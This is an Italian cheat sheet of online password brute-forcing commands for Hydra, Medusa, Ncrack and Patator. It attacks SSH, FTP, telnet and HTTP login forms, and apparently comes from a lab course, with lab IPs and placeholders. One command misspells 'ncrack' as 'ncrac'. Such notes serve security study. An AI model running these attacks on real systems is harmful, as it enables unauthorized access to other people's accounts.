#Password cracking
## Hydra e Medusa

| Obiettivo | Comando | Note |
|---|---|---|
| SSH utente singolo + password list | `hydra -l musa -P /home/kali/Downloads/password.lst ssh://172.16.4.16` | esempio lab |
| HTTP POST form | `hydra -l fatima -P /home/kali/Downloads/password.lst 172.16.4.16 http-post-form "/path/al/form:username=^USER^&password=^PASS^:Login errata"` | il terzo campo è il messaggio di fallimento |
| FTP con Medusa | `medusa -h 172.16.4.16 -u hassan -P /home/kali/Downloads/password.lst -M ftp` | modulo FTP |

## Opzioni Hydra

| Opzione | Uso |
|---|---|
| `-l` | utente singolo |
| `-L` | file utenti |
| `-p` | password singola |
| `-P` | file password |
| `-C` | file `login:password` |
| `-M` | file host per attacco parallelo |
| `-f` | interrompe al primo match |
| `-R` | riprende sessione `.restore` |

**Tag ricerca:** `hydra`, `medusa`, `password attack`, `bruteforce`, `ssh`, `ftp`, `http-post-form`.

---

## Ncrack

| Obiettivo | Comando | 
|---|---|
| comando base | `ncrack ip_target -p ssh:50,telnet` con il parametro -p è possibile indicare più protocolli da sondare |
| comando base su intera net | `ncrack net_ip/cidr` |
| Indicare utente e password da testare | `ncrack ip_target -p ssh:50 --user nome_utente1,nome_utente2 --pass password1,password2` |
| Utilizzo di dizionari, in /usr/share/ncrack ci sono dei dizionari default, è possibile utilizzare quelli cehe più preferiamo | `ncrack ip_target -p ssh:50 -U path -P path`|
| Impostare ulteriori parametri | `ncrack ip_target -p ssh:50 -m ssh:to=10s` imposta un timeout |
| Riprendere la ricerca da dove è stata interrotta. | `ls -ltr .ncrack/` ritorna l'elenco dei restore disponibili `ncrack --resume .ncrack/restore...` |

### Ncrack e Nmap

| Obiettivo | Comando | 
|---|---|
| scansione nmap con report .xml | `nmap -sV ip/cidr -oX rete.xml` |
| armare ncrack con il report precedente | `ncrac -iX rete.xml -U user.txt -P pass.txt` |

---

## Patator
Esempio credenziali ssh 

```text
patator ssh_login \
host=ip user=scott password=FILE0 0=pass.txt \
-x ignore:mesg='Authentication failsed.'
```

FILE0 si riferisce al file passato da riga di comando con indice 0 (è possibile inserire più file con indice diverso)
